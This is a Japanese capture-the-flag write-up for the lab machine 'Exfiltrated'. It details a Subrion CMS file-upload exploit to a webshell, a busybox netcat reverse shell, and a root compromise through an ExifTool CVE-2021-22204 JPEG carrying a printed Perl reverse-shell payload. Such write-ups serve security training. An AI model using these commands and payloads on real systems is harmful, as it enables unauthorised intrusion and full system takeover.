+++
title = "Proving Grounds Practice - Exfiltrated Writeup"
date = "2026-11-19"
description = "Subrion CMS 4.2.1の任意ファイルアップロード脆弱性（CVE-2018-19422）を悪用して初期アクセスを獲得し、root権限で実行されるcronジョブとExifToolの脆弱性（CVE-2021-22204）を利用して特権昇格"
tags = ["Proving Grounds Practice", "CTF", "[Linux]", "[Subrion CMS 4.2.1 - Arbitrary File Upload]", "[CVE-2018-19422]", "[ExifTool - CVE-2021-22204]", "[Cron Job Privilege Escalation]", "[Easy]"]
categories = ["Proving Grounds Practice"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | Exfiltrated |
| OS | Linux |
| IP Address | 192.168.103.163 |
| Difficulty | Easy |

---

## Reconnaissance

### Nmap Scan

まず、Nmapを使用して開放ポートとサービスのバージョンを確認する。

```bash
nmap -sV -sC 192.168.103.163
```

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-19 21:03 +0900
Nmap scan report for 192.168.103.163
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 7 disallowed entries
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/
|_/updates/
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://exfiltrated.offsec/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.44 seconds
```

22/tcpでSSH、80/tcpでHTTPが開放されていることを確認した。

また、HTTPアクセス時に `exfiltrated.offsec` へリダイレクトされることが分かった。

そのため、Kali側の `/etc/hosts` に以下を追加する。

```bash
sudo nano /etc/hosts
```

```text
192.168.103.163 exfiltrated.offsec
```

### Web Enumeration

ブラウザから以下のURLにアクセスする。

```text
http://exfiltrated.offsec/
```

Webサイトを確認すると、管理画面へのリンクが存在する。

管理画面にアクセスする。

```text
http://exfiltrated.offsec/panel/
```

ログイン画面から使用されているCMSが **Subrion CMS 4.2.1** であることが判明した。

デフォルト認証情報を試したところ、以下の組み合わせでログインに成功した。

```text
Username: admin
Password: admin
```

### Vulnerability Enumeration

Subrion CMS 4.2.1の脆弱性を調べるため、SearchSploitを使用する。

```bash
searchsploit Subrion CMS
```

```text
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   | Path
--------------------------------------------------------------------------------- ---------------------------------
Subrion 3.x - Multiple Vulnerabilities                                           | php/webapps/38525.txt
SUBRION CMS - Multiple Vulnerabilities                                           | php/webapps/17390.txt
Subrion CMS 2.2.1 - Cross-Site Request Forgery (Add Admin)                       | php/webapps/21267.txt
subrion CMS 2.2.1 - Multiple Vulnerabilities                                     | php/webapps/22159.txt
Subrion CMS 4.0.5 - Cross-Site Request Forgery (Add Admin)                       | php/webapps/47851.txt
Subrion CMS 4.0.5 - Cross-Site Request Forgery Bypass / Persistent Cross-Site Sc | php/webapps/40553.txt
Subrion CMS 4.0.5 - SQL Injection                                                | php/webapps/40202.txt
Subrion CMS 4.2.1 - 'avatar[path]' XSS                                           | php/webapps/49346.txt
Subrion CMS 4.2.1 - Arbitrary File Upload                                        | php/webapps/49876.py
Subrion CMS 4.2.1 - Cross Site Request Forgery (CSRF) (Add Amin)                 | php/webapps/50737.txt
Subrion CMS 4.2.1 - Cross-Site Scripting                                         | php/webapps/45150.txt
Subrion CMS 4.2.1 - Stored Cross-Site Scripting (XSS)                            | php/webapps/51110.txt
--------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

検索結果から、Subrion CMS 4.2.1には任意ファイルアップロードの脆弱性が存在することが分かった。

該当するExploitは以下の通り。

- Exploit: Subrion CMS 4.2.1 - Arbitrary File Upload
- CVE: CVE-2018-19422
- Exploit DB: 49876

この脆弱性を利用してWebシェルをアップロードし、初期アクセスを取得する。

---

## Initial Access

### Subrion CMS - Arbitrary File Upload (CVE-2018-19422)

SearchSploitで確認したExploitを利用する。

```bash
searchsploit -m php/webapps/49876.py
```

取得したExploitを実行する。

```bash
python3 49876.py -u http://exfiltrated.offsec/panel/ -l admin -p admin
```

```text
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422

[+] Trying to connect to: http://exfiltrated.offsec/panel/
[+] Success!
[+] Got CSRF token: 81bMuIubOjY3ZRWifyuaPPh8DPiP5uaZ0L3IYSOP
[+] Trying to log in...
[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell name: rjtuwuuqenvrbyk

[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://exfiltrated.offsec/panel/uploads/rjtuwuuqenvrbyk.phar
```

Webシェルのアップロードに成功した。

表示されたWebシェルのURLにアクセスしてコマンドを実行する。

```bash
whoami
```

```text
www-data
```

これにより、`www-data` 権限でコマンドを実行できることを確認した。

### Reverse Shell

Webシェルは操作性が悪いため、リバースシェルを取得する。

まず、Kali側のVPNインターフェースのIPアドレスを確認する。

今回使用した攻撃者側のIPアドレスは `192.168.45.187`。

Kali側でリスナーを起動する。

```bash
nc -lvnp 2222
```

Webシェルから以下を実行する。

```bash
busybox nc 192.168.45.187 2222 -e bash
```

リバースシェルの接続を確認する。

```text
listening on [any] 2222 ...
connect to [192.168.45.187] from (UNKNOWN) [192.168.103.163] 54278

whoami
www-data
```

シェルを対話的に操作できるようにする。

```bash
script /dev/null -c bash
```

```text
Script started, file is /dev/null
www-data@exfiltrated:/var/www/html/subrion/uploads$
```

これで `www-data` 権限のシェルを取得できた。

---

## Privilege Escalation

### Linux Enumeration

初期アクセス後、権限昇格につながる設定や脆弱性を調査するため、LinPEASを使用する。

まず、Kali側でHTTPサーバーを起動する。

```bash
python3 -m http.server 8000
```

ターゲット側でLinPEASをダウンロードする。

```bash
wget http://192.168.45.187:8000/linpeas.sh
```

実行権限を付与して実行する。

```bash
chmod +x linpeas.sh
./linpeas.sh
```

調査を進めたところ、root権限で実行されるcronジョブが存在することを確認した。

```text
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *   root    bash /opt/image-exif.sh
```

毎分root権限で `/opt/image-exif.sh` が実行されている。

このスクリプトの内容を確認する。

```bash
cat /opt/image-exif.sh
```

```bash
#! /bin/bash
#07/06/18 A BASH script to collect EXIF metadata

echo -ne "\n metadata directory cleaned! \n\n"

IMAGES='/var/www/html/subrion/uploads'

META='/opt/metadata'
FILE=`openssl rand -hex 5`
LOGFILE="$META/$FILE"

echo -ne "\n Processing EXIF metadata now... \n\n"
ls $IMAGES | grep "jpg" | while read filename;
do
    exiftool "$IMAGES/$filename" >> $LOGFILE
done

echo -ne "\n\n Processing is finished! \n\n\n"
```

スクリプトの処理内容は以下の通り。

1. `/var/www/html/subrion/uploads` を画像ファイルの格納先として指定する。
2. `/opt/metadata` にEXIF情報を出力するログファイルを作成する。
3. uploadsディレクトリ内からファイル名に `jpg` を含むファイルを検索する。
4. 対象ファイルに対して `exiftool` を実行し、EXIFメタデータを取得する。

重要なのは、この処理がroot権限で毎分実行される点である。

つまり、Webシェル経由でuploadsディレクトリに細工したJPEGファイルを配置できれば、root権限でそのファイルがExifToolによって処理される。

### ExifTool - CVE-2021-22204

まず、ターゲットにインストールされているExifToolのバージョンを確認する。

```bash
exiftool -ver
```

```text
11.88
```

調査したところ、ExifTool 11.88は **CVE-2021-22204** の影響を受けるバージョンであることが分かった。

この脆弱性は、ExifToolがDjVuファイルのメタデータを処理する際に発生する任意コード実行の脆弱性である。

今回の環境では、root権限で実行されるcronジョブがExifToolを使用しているため、この脆弱性を利用した権限昇格が可能となる。

Exploitは以下のGitHubリポジトリを使用する。

https://github.com/UNICORDev/exploit-CVE-2021-22204

#### Exploit Preparation

Kali側でExploitを取得する。

```bash
git clone https://github.com/UNICORDev/exploit-CVE-2021-22204.git
```

ディレクトリに移動する。

```bash
cd exploit-CVE-2021-22204
```

実行権限を付与する。

```bash
chmod +x exploit-CVE-2021-22204.py
```

Exploitの依存パッケージであるDjVuLibreをインストールする。

```bash
sudo apt install djvulibre-bin
```

#### Generate Malicious JPEG

Kali側でリバースシェル用のJPEGファイルを生成する。

まず、別のターミナルでリスナーを起動する。

```bash
nc -lvnp 4444
```

Exploitを実行する。

```bash
python3 exploit-CVE-2021-22204.py -s 192.168.45.187 4444
```

```text
UNICORD: Exploit for CVE-2021-22204 (ExifTool) - Arbitrary Code Execution

PAYLOAD: (metadata "\c${use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(4444,inet_aton('192.168.45.187')))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};};")

DEPENDS: Dependencies for exploit are met!
PREPARE: Payload written to file!
PREPARE: Payload file compressed!
PREPARE: DjVu file created!
PREPARE: JPEG image created/processed!
PREPARE: Exiftool config written to file!
EXPLOIT: Payload injected into image!
CLEANUP: Old file artifacts deleted!
SUCCESS: Exploit image written to "image.jpg"
```

これにより、細工された `image.jpg` が生成された。

#### Upload Malicious JPEG

生成したJPEGファイルをターゲットに転送する。

Kali側でHTTPサーバーを起動する。

```bash
python3 -m http.server 80
```

ターゲット側のリバースシェルから、cronジョブが監視しているuploadsディレクトリに移動する。

```bash
cd /var/www/html/subrion/uploads
```

生成したJPEGファイルをダウンロードする。

```bash
wget http://192.168.45.187:80/image.jpg
```

ファイルが配置された後、cronジョブによってExifToolがroot権限で実行されるのを待つ。

#### Root Shell

Kali側で起動していた4444番ポートのリスナーに接続が返ってくる。

```text
listening on [any] 4444 ...
connect to [192.168.45.187] from (UNKNOWN) [192.168.103.163] 46922

/bin/sh: 0: can't access tty; job control turned off
```

接続後、現在のユーザーを確認する。

```bash
whoami
```

```text
root
```

**root権限の取得に成功した。**

### Capture Flags

rootシェルから `local.txt` と `proof.txt` を確認する。

```bash
cat local.txt
```

```text
dbfe9222e30ba4f708ab8f459bf12b4a
```

```bash
cat proof.txt
```

```text
c67f735c9bcdae965d5b347a4d4181c6
```

両方のフラグを取得できた。

---

## Summary

Exfiltratedでは、Subrion CMS 4.2.1のデフォルト認証情報（admin:admin）を利用して管理画面にログインし、CVE-2018-19422（任意ファイルアップロード）を悪用してWebシェルをアップロードした。

その後、リバースシェルを取得してwww-data権限で侵入した。

特権昇格では、LinPEASによる調査から毎分root権限で実行されるcronジョブ `/opt/image-exif.sh` を発見した。このスクリプトがuploadsディレクトリ内のJPEGファイルをExifToolで処理していることに着目した。

ExifTool 11.88に存在するCVE-2021-22204を利用し、細工したJPEGファイルをuploadsディレクトリに配置することで、root権限のリバースシェルを取得した。

**攻撃の流れ**

1. Nmapによるポートスキャン（22/tcp、80/tcp）
2. Subrion CMS 4.2.1の特定
3. デフォルト認証情報（admin:admin）で管理画面にログイン
4. CVE-2018-19422による任意ファイルアップロード
5. Webシェルからwww-data権限を取得
6. BusyBox Netcatによるリバースシェル
7. LinPEASでroot権限のcronジョブを発見
8. ExifTool 11.88のCVE-2021-22204を悪用
9. root権限のリバースシェルを取得
10. local.txt / proof.txt を取得

**Initial Access:** Subrion CMS 4.2.1 - Arbitrary File Upload (CVE-2018-19422)

**Privilege Escalation:** ExifTool 11.88 - CVE-2021-22204 via root cron job

**Final Access:** root
